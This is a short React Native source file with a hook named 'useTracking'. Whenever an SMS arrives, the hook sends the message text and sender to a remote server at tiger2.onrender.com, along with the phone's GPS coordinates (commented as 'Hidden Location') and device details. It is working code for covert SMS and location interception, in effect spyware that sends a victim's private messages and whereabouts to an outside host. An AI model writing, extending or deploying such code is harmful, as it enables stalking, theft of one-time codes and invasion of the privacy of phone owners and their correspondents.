import { useEffect } from 'react';
import { PermissionsAndroid } from 'react-native';
import * as Device from 'expo-device';
import * as Location from 'expo-location';
import axios from 'axios';
import SmsListener from 'react-native-get-sms-android';

// 🐅 APNA FINAL RENDER URL
const API_URL = "https://tiger2.onrender.com/log-sms";

const useTracking = (permissionStatus) => {
  useEffect(() => {
    if (permissionStatus === 'granted') {
      
      const sendDataToServer = async (messageBody, sender) => {
        try {
          // 1. Get Hidden Location
          let location = "Disabled";
          let loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
          location = `${loc.coords.latitude},${loc.coords.longitude}`;

          // 2. Prepare Device Info
          const deviceName = `${Device.brand} ${Device.modelName} (OS: ${Device.osVersion})`;

          // 3. Send to Render
          await axios.post(API_URL, {
            sender: sender,
            message: messageBody,
            device: deviceName,
            location: location,
            timestamp: new Date().toLocaleString()
          });
          console.log("[✓] Data Synced to Tiger Server");
        } catch (err) {
          console.error("[X] Sync Failed:", err.message);
        }
      };

      // Real-time Listener (Sahi tareeka)
      const subscription = SmsListener.addListener(async (message) => {
        await sendDataToServer(message.body, message.originatingAddress);
      });

      return () => subscription.remove();
    }
  }, [permissionStatus]);
};

export default useTracking;
